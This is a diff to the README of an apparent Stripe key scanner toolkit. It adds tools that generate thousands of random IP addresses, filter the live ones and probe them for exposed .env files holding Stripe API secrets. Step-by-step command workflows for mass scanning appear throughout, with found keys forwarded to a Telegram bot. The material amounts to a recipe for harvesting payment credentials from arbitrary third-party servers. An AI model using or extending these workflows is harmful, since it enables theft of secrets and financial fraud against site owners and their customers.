@@ -1,9 +1,20 @@
 # 🔑 Stripe Key Scanner
 
-A powerful multithreaded Python tool for scanning websites to find exposed `.env` files containing Stripe API keys and secrets.
+A comprehensive toolkit for finding exposed `.env` files containing Stripe API keys and secrets. Includes automated IP generation, live checking, and intelligent scanning.
+
+## 🛠️ Tools Included
+
+| Tool | Description | Use Case |
+|------|-------------|----------|
+| **code.py** | Main Stripe scanner | Scan URLs/IPs for exposed Stripe keys |
+| **checklive.py** | Fast live/dead checker | Filter live targets before scanning |
+| **ipgen.py** | IP generator & range tool | Generate target IPs and ranges |
+| **autoscan.py** | Automated workflow orchestrator | One-command full workflow automation |
+| **path.txt** | 500+ .env paths database | Comprehensive path coverage |
 
 ## ✨ Features
 
+### Core Scanner (code.py)
 - 🚀 **Multithreaded scanning** - Fast concurrent processing (default: 10 threads)
 - 🎯 **Smart detection** - Scans 40+ common `.env` file paths
 - 📦 **Extended path list** - Optional 500+ path file for comprehensive scanning
@@ -14,6 +25,23 @@ A powerful multithreaded Python tool for scanning websites to find exposed `.env
 - 🔄 **Retry mechanism** - Automatic retries with exponential backoff
 - 🛡️ **Memory protection** - Response size limits to prevent memory issues
 - 📤 **Multiple output formats** - Text files and optional JSON output
+
+### Live Checker (checklive.py)
+- ⚡ **Fast multithreaded checking** - Quickly filter dead targets
+- 🎨 **Colored output** - Easy-to-read results
+- 📈 **Performance metrics** - URLs/second statistics
+
+### IP Generator (ipgen.py)
+- 🎲 **Random IP generation** - Generate thousands of random IPs
+- 📋 **Range expansion** - Expand IP prefixes to full ranges (65,536 IPs per prefix)
+- 🔧 **Custom ranges** - Generate specific IP ranges
+- 🌐 **ENV suffix support** - Add /.env to generated IPs
+
+### AutoScan (autoscan.py)
+- 🤖 **Full automation** - One command for complete workflow
+- 📊 **Statistics tracking** - Comprehensive progress and results
+- 🎯 **Smart workflow** - Generate → Check → Scan automatically
+- 📁 **Session management** - Organized output in timestamped directories
 
 ## 📋 Requirements
 
@@ -66,7 +94,90 @@ TELEGRAM_CHAT_ID = "123456789"
 
 ## 📖 Usage
 
-### Basic Usage
+### 🤖 AutoScan - Automated Workflow (Recommended)
+
+The easiest way to get started - fully automated scanning:
+
+```bash
+# Quick scan with 1000 random IPs
+python autoscan.py --count 1000
+
+# Medium scan with 5000 IPs and comprehensive paths
+python autoscan.py --count 5000 --path-file path.txt
+
+# Large scan with custom threads and Telegram
+python autoscan.py --count 10000 \
+  --live-threads 20 \
+  --scan-threads 15 \
+  --path-file path.txt \
+  --telegram-token "YOUR_TOKEN" \
+  --telegram-chat-id "YOUR_CHAT_ID"
+
+# Generate IPs with /.env suffix
+python autoscan.py --count 1000 --env
+```
+
+**AutoScan automatically:**
+1. Generates random IPs
+2. Checks which IPs are live
+3. Scans live IPs for Stripe keys
+4. Provides comprehensive statistics
+
+---
+
+### 🎯 Manual Workflow (Step-by-step)
+
+For more control, use individual tools:
+
+#### Step 1: Generate IPs (ipgen.py)
+
+```bash
+# Generate 1000 random IPs
+python ipgen.py --random 1000 -o ips.txt
+
+# Generate with /.env suffix
+python ipgen.py --random 1000 --env -o ips.txt
+
+# Generate IP ranges from prefix file
+python ipgen.py --range-file prefixes.txt -o ranged_ips.txt
+
+# Interactive menu mode
+python ipgen.py
+```
+
+#### Step 2: Check Live IPs (checklive.py)
+
+```bash
+# Basic live check
+python checklive.py --list ips.txt
+
+# With custom threads and timeout
+python checklive.py --list ips.txt --threads 20 --timeout 10
+
+# Verbose mode (show dead IPs)
+python checklive.py --list ips.txt --verbose
+```
+
+#### Step 3: Scan for Stripe Keys (code.py)
+
+```bash
+# Scan live IPs
+python code.py --list Results/live.txt
+
+# With comprehensive path file
+python code.py --list Results/live.txt --path-file path.txt
+
+# With Telegram notifications
+python code.py --list Results/live.txt \
+  --telegram-bot-token "YOUR_TOKEN" \
+  --telegram-chat-id "YOUR_CHAT_ID"
+```
+
+---
+
+### 💻 Core Scanner Usage (code.py)
+
+#### Basic Usage
 
 ```bash
 # Interactive mode (will prompt for URL list)
@@ -84,7 +195,7 @@ python code.py --list urls.txt \
   --telegram-chat-id "YOUR_CHAT_ID"
 ```
 
-### Advanced Options
+#### Advanced Options
 
 ```bash
 # Use 500+ path file for comprehensive scanning
@@ -275,7 +386,63 @@ The authors are not responsible for misuse of this tool.
 - Reduce `--threads` to avoid overwhelming the network
 - Add `--rate 0.5` for rate limiting
 
-## 📝 Example Workflow
+## 📝 Example Workflows
+
+### Workflow 1: Automated Scan (Easiest)
+
+```bash
+# One-command automated scan
+python autoscan.py --count 5000 \
+  --path-file path.txt \
+  --telegram-token "YOUR_TOKEN" \
+  --telegram-chat-id "YOUR_CHAT_ID"
+
+# Check results
+cat Results/STRIPE.txt
+```
+
+### Workflow 2: Manual Step-by-step
+
+```bash
+# Step 1: Generate 10,000 random IPs
+python ipgen.py --random 10000 -o ips.txt
+
+# Step 2: Check which IPs are live
+python checklive.py --list ips.txt --threads 20
+
+# Step 3: Scan live IPs for Stripe keys
+python code.py --list Results/live.txt --path-file path.txt
+
+# Step 4: Check results
+cat Results/STRIPE.txt
+cat Results/scan.log
+```
+
+### Workflow 3: IP Range Scanning
+
+```bash
+# Step 1: Create IP prefix file
+cat > prefixes.txt << EOF
+192.168
+10.0
+172.16
+EOF
+
+# Step 2: Generate IP ranges (196,608 IPs)
+python ipgen.py --range-file prefixes.txt -o ranged.txt
+
+# Step 3: Check live (with high threads)
+python checklive.py --list ranged.txt --threads 50
+
+# Step 4: Scan with comprehensive paths
+python code.py --list Results/live.txt \
+  --path-file path.txt \
+  --threads 20 \
+  --telegram-bot-token "YOUR_TOKEN" \
+  --telegram-chat-id "YOUR_CHAT_ID"
+```
+
+### Workflow 4: Scan Existing URL List
 
 ```bash
 # 1. Create URL list
@@ -285,11 +452,11 @@ http://example2.com
 http://example3.com
 EOF
 
-# 2. Quick scan with defaults
-python code.py --list targets.txt
+# 2. Check live URLs first
+python checklive.py --list targets.txt
 
 # 3. Comprehensive scan with Telegram
-python code.py --list targets.txt \
+python code.py --list Results/live.txt \
   --path-file path.txt \
   --threads 15 \
   --telegram-bot-token "123456:ABC..." \
